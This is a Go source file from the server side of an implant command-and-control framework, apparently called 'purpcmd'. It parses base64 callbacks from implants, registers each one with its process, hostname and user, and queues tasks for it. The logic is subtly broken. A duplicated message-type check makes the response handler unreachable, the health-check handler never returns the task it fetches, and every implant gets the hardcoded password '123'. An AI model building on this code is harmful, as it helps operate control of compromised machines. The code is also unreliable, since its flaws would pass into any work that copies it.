package implant

import (
	"bytes"
	"encoding/base64"
	"encoding/binary"
	"errors"
	"fmt"
	"io"
	"net/http"
	"purpcmd/server/log"
	//"purpcmd/server/log"
)

func ParseCallback(d io.ReadCloser, req *http.Request) int {
	r := base64.NewDecoder(base64.StdEncoding, d)
	var messageType uint16

	err := binary.Read(r, binary.BigEndian, &messageType)
	if err != nil {
		if err == io.EOF {
			return NIL
		}
	}

	if messageType == REG {
		ParseAndReg(r, req)
		return REG
	} else if messageType == CHK {
		err = ParseCheck(r, req)
		if err != nil {
			return NIL
		}
		return CHK
	} else if messageType == CHK {
		err = ParseResponse(r, req)
		if err != nil {
			return NIL
		}
		return CHK
	}

	return NIL
}

func ParseAndReg(r io.Reader, req *http.Request) error {
	i := new(ImplantMetadata)
	var arch byte
	var dataLen uint16
	binary.Read(r, binary.BigEndian, &i.PID)
	binary.Read(r, binary.BigEndian, &i.SessionID)
	binary.Read(r, binary.BigEndian, &i.IP)
	binary.Read(r, binary.BigEndian, &i.Port)
	binary.Read(r, binary.BigEndian, &i.Sleep)
	binary.Read(r, binary.BigEndian, &arch)
	binary.Read(r, binary.BigEndian, &dataLen)

	data := make([]byte, dataLen)
	binary.Read(r, binary.BigEndian, &data)

	dataS := bytes.Split(data, SEP)
	if len(dataS) != 3 {
		fmt.Println("data must have 3 entities and have ", i.PID, data)
		return errors.New("data must have 3 entities and have")
	}
	i.Proc = string(dataS[0])
	i.Hostname = string(dataS[1])
	i.User = string(dataS[2])

	name := fmt.Sprintf("%d", i.SessionID)
	if ImplantPtrByName(name) != nil {
		return errors.New("session/implant exists. can't register another with same name")
	}

	imp := ImplantNew(name, "123")
	imp.ImplantSetMetadata(i)
	imp.ImplantSetRemoteSocket(req.RemoteAddr)
	imp.ImplantAddImplant()
	return nil
}

// ParseCheck parse health check
func ParseCheck(r io.Reader, req *http.Request) error {
	var PID uint32
	var SessionID uint32
	var Sleep uint32
	var IP uint32
	var Port uint16
	var Arch byte

	binary.Read(r, binary.BigEndian, &PID)
	binary.Read(r, binary.BigEndian, &SessionID)
	binary.Read(r, binary.BigEndian, &IP)
	binary.Read(r, binary.BigEndian, &Port)
	binary.Read(r, binary.BigEndian, &Sleep)
	binary.Read(r, binary.BigEndian, &Arch)

	name := fmt.Sprintf("%d", SessionID)
	imp := ImplantPtrByName(name)
	if imp == nil {
		return errors.New("no session with name")
	}
	imp.ImplantUpdateLastseen()

	data, tid, err := imp.ImplantGetTaskStr()
	if err != nil {
		return nil
	}

	log.AsyncWriteStdoutInfo(fmt.Sprintf("Sending task %s of %d bytes to %s\n", string(tid[:]), len(data), imp.Name))
	return nil
}

func ParseResponse(r io.Reader, req *http.Request) error {
	var PID uint32
	var SessionID uint32
	var Sleep uint32
	var IP uint32
	var Port uint16
	var Arch byte

	binary.Read(r, binary.BigEndian, &PID)
	binary.Read(r, binary.BigEndian, &SessionID)
	binary.Read(r, binary.BigEndian, &IP)
	binary.Read(r, binary.BigEndian, &Port)
	binary.Read(r, binary.BigEndian, &Sleep)
	binary.Read(r, binary.BigEndian, &Arch)

	name := fmt.Sprintf("%d", SessionID)
	imp := ImplantPtrByName(name)
	if imp == nil {
		return errors.New("no session with name")
	}
	imp.ImplantUpdateLastseen()

	var TaskID [8]byte
	binary.Read(r, binary.BigEndian, &TaskID)

	TaskIDStr := TaskID
	taskPtr := TaskGetPtrById(name, TaskIDStr)
	if taskPtr == nil {
		return errors.New("no task with given id")
	}

	log.AsyncWriteStdout(fmt.Sprintf("Response - session:%s task:%s\n", name, TaskIDStr))
	return nil
}
